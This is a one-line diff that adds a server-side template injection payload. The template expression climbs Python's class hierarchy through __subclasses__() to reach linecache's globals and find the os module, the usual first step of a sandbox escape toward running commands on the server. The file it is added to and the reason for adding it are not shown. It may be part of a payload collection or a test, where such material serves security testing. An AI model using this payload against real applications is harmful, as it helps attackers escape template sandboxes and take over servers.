@@ -1,0 +1,1 @@
+{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')}}
